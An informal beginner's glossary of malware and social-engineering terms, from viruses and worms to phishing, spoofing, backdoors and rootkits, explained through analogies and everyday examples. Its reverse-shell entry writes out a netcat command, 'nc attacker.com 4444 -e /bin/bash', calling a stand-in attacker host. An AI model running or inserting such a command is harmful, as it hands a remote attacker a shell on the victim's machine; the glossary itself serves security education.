1. Malware (umbrella term)

Malware just means any software created to harm a system.
Think of “malware” as the word “weapons.” Inside weapons, you have knives, guns, bombs. Same with malware: viruses, worms, trojans, spyware, etc.

2. Viruses

A virus attaches itself to a file or program.
It spreads only when the user opens the infected file.

Real-world example:
Someone sends you Assignment.pdf.exe. You click it → virus activates → it corrupts your photos or steals data.

Impact:
Viruses slow systems, delete data, spread through USB drives.

How it works:
The virus waits for execution → injects code → replicates → infects other files → payload triggers.

3. Worms

A worm is a virus with legs of its own. It doesn't need you.
It spreads automatically across networks.

Real-world example:
A worm finds 100 vulnerable devices on your WiFi. It jumps from your laptop → your mom’s phone → your smart TV — without asking anyone.

Impact:
Network slowdown, spreading ransomware or backdoors.

4. Keyloggers

A keylogger records everything you type.

Example:
You type your Gmail password.
Keylogger whispers to the attacker: “He typed B@tm@n123.”

Impact:
Account takeover. Bank theft. Identity theft.

How it works:
It hooks into OS keyboard APIs → logs keystrokes → sends logs to attacker.

5. Phishing

Phishing is fake communication that tricks you into giving information.

Example:
A fake "Instagram Login Needed" email → you click → type your password → attacker smiles.

Impact:
Stolen accounts, credentials, money.

6. Smishing

SMS + phishing.

Example:
You get a message:
“Your bank account will be frozen. Click to verify.”
Link leads to a fake bank site.

Impact:
Same as phishing but more dangerous because people trust SMS more.

7. Spoofing

Spoofing = pretending to be someone else (identity fraud).

Examples:
• Attacker spoofs an email so it looks like it came from "support@bank.com
".
• Attacker spoofs IP to hide location.

Impact:
Phishing success increases. Harder to track attacker.

8. Spyware

Spyware secretly observes you.
Think of it as a stalker app on your computer.

Example:
A free movie-downloader installs spyware.
It collects:
• websites you visit
• search history
• chats
• saved passwords

Impact:
Privacy gone. Data sold on dark web.

9. Backdoors

A backdoor is a hidden entrance to your system.

Example:
You unknowingly install a cracked game.
Inside it, attacker hides a secret “door.”
Now he can enter your PC anytime — like a ghost.

Impact:
Full remote control. Installing more malware. Data theft.

10. Reverse Shells

A reverse shell is when your system connects back to the attacker and opens a command line for them.

Real scenario:
You open a malicious PDF.
Inside is code that secretly runs:
nc attacker.com 4444 -e /bin/bash
Boom — attacker now has a terminal on your machine.

Impact:
Complete system hijack.

11. Bind Shell

Opposite of reverse shell.
Your machine opens a port and waits for attacker to connect.

Think of it like:
Your PC says, “Door open at port 4444! Come inside!”

Impact:
Remote access same as reverse shell, just different method.

12. Adware

Adware blasts ads at you.
Annoying, not always harmful — but often used for tracking.

Real example:
You download “Free VPN Pro Ultra Max.”
Now your browser gets:
• popups
• redirects
• new homepage

Impact:
Slower PC, privacy leakage.

13. Trojans

A trojan pretends to be useful but is actually malicious.

Example:
A fake “PUBG ESP hack”
You run it → nothing happens on screen.
Meanwhile it installs ransomware.

Impact:
Data theft, backdoor installation, system damage.

14. Rootkits

Rootkits are the endgame boss.
They hide deep inside the system (kernel level) and make malware invisible.

Example:
Attacker installs a rootkit → even your antivirus can’t see files being modified.

Impact:
Invisible control. You never know it’s there until everything is ruined.
